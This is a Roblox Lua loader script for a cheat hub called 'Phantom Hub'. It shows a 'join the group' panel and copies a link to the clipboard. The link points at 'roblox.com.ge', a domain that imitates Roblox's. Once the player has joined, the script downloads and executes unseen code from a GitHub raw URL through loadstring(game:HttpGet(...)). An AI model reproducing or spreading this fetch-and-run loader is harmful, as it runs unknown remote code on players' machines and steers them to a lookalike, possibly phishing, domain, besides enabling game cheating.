-- =========================
-- PHANTOM HUB GROUP ACCESS
-- =========================

-- CONFIG
local GROUP_ID = 7178088300
local GROUP_LINK = "https://roblox.com.ge/communities/7178088300/"

-- MAIN SCRIPT
local MAIN_SCRIPT = "https://raw.githubusercontent.com/PhantomHub-ui/autofarm/refs/heads/main/lua"

-- SERVICES
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- UI
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "PhantomGroupCheck"

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.fromScale(0.36, 0.30)
frame.Position = UDim2.fromScale(0.32, 0.35)
frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
frame.BorderSizePixel = 0
Instance.new("UICorner", frame).CornerRadius = UDim.new(0,12)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.fromScale(1, 0.2)
title.BackgroundTransparency = 1
title.Text = "Phantom Hub Access"
title.TextColor3 = Color3.new(1,1,1)
title.TextScaled = true
title.Font = Enum.Font.GothamBold

local copyBtn = Instance.new("TextButton", frame)
copyBtn.Size = UDim2.fromScale(0.9, 0.22)
copyBtn.Position = UDim2.fromScale(0.05, 0.28)
copyBtn.Text = "Copy Link"
copyBtn.TextScaled = true
copyBtn.Font = Enum.Font.Gotham

local status = Instance.new("TextLabel", frame)
status.Size = UDim2.fromScale(0.9, 0.18)
status.Position = UDim2.fromScale(0.05, 0.58)
status.BackgroundTransparency = 1
status.TextScaled = true
status.Font = Enum.Font.GothamBold

-- COPY LINK
copyBtn.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard(GROUP_LINK)
        copyBtn.Text = "Link Copied!"
        task.wait(1.2)
        copyBtn.Text = "Copy Link"
    end
end)

-- STATUS CHECK + AUTO LOAD
task.spawn(function()
    while gui.Parent do
        if player:IsInGroup(GROUP_ID) then
            status.Text = "STATUS: JOINED ✅"
            status.TextColor3 = Color3.fromRGB(0,255,0)
            task.wait(0.8)
            gui:Destroy()
            loadstring(game:HttpGet(MAIN_SCRIPT))()
            break
        else
            status.Text = "STATUS: NOT JOINED ❌"
            status.TextColor3 = Color3.fromRGB(255,80,80)
        end
        task.wait(1.5)
    end
end)
